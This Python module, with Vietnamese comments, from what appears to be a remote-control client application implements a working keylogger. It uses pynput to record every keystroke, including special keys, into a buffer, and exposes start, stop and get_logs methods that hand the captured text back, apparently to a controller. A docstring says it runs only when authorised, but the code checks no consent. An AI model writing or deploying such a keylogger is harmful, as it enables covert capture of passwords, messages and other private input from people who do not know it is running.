# client-app/modules/keylogger.py
from pynput import keyboard
import logging

logger = logging.getLogger("Module-Keylogger")

class KeyloggerManager:
    """Module theo dõi phím gõ người dùng (Chỉ chạy khi được phân quyền)."""
    
    def __init__(self):
        self.log_data = ""
        self.listener = None
        self.is_running = False

    def _on_press(self, key):
        """Hàm callback nội bộ bắt sự kiện khi một phím được nhấn."""
        try:
            # Nếu là phím ký tự bình thường (a-z, 0-9)
            self.log_data += key.char
        except AttributeError:
            # Xử lý các phím đặc biệt
            if key == keyboard.Key.space:
                self.log_data += " "
            elif key == keyboard.Key.enter:
                self.log_data += "\n"
            elif key == keyboard.Key.backspace:
                self.log_data += "[BACKSPACE]"
            else:
                self.log_data += f"[{key.name.upper()}]"

    def start(self) -> dict:
        """Bắt đầu ghi nhận phím gõ."""
        if not self.is_running:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
            self.is_running = True
            logger.info("⌨️ Keylogger đã khởi động.")
            return {"success": True, "message": "Đã BẬT bộ ghi phím."}
        return {"success": True, "message": "Bộ ghi phím đang chạy sẵn."}

    def stop(self) -> dict:
        """Dừng ghi nhận phím."""
        if self.is_running and self.listener:
            self.listener.stop()
            self.is_running = False
            logger.info("⌨️ Keylogger đã dừng.")
            return {"success": True, "message": "Đã TẮT bộ ghi phím."}
        return {"success": True, "message": "Bộ ghi phím đã tắt từ trước."}

    def get_logs(self, clear_after_read: bool = True) -> dict:
        """Lấy dữ liệu phím đã gõ và xóa bộ đệm nếu cần."""
        current_logs = self.log_data
        if clear_after_read:
            self.log_data = ""
        return {"success": True, "logs": current_logs}

# Khởi tạo instance
keylogger_manager = KeyloggerManager()